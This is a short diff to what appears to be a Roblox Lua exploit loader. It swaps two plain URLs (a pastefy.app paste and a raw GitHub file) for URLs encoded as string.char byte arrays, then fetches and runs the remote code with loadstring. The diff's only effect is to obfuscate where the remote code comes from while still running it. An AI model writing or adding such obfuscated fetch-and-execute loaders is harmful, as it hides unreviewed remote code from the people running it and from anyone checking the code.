@@ -1,3 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/K1ty0Gcd/raw"))()
+local url1 = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,75,49,116,121,48,71,99,100,47,114,97,119)
+local url2 = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,77,101,114,99,101,110,97,114,105,101,115,86,51,47,49,50,53,49,50,53,49,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,116,101,115,116,49,49)
+loadstring(game:HttpGet(url1))()
 task.wait(0.005)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/12512512/refs/heads/main/test11"))()
+loadstring(game:HttpGet(url2))()
